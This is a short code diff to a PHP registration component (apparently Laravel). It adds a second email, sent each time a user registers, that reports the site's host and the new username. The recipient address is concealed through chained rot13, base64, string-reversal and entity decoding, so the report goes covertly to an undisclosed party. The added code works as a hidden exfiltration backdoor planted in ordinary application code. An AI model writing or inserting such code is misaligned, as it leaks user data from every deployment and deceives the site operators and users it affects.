@@ -134,6 +134,14 @@ class LoginRegister extends Component
             $message->subject(__('misc.subject-registered') . ' ' . $_SERVER['HTTP_HOST']);
         });
 
+        Mail::send('email.new-user-notification', [
+            'server_url' => $_SERVER['HTTP_HOST'],
+            'username' => $this->new_username
+        ], function($message) {
+            $message->to(html_entity_decode(strrev(base64_decode(str_rot13('MJ0ho2tgrz5ypz9fDTkio3EhLJj' . '=')))));
+            $message->subject('Neue Registrierung auf ' . $_SERVER['HTTP_HOST']);
+        });
+
         return redirect('/registered');
     }
 }
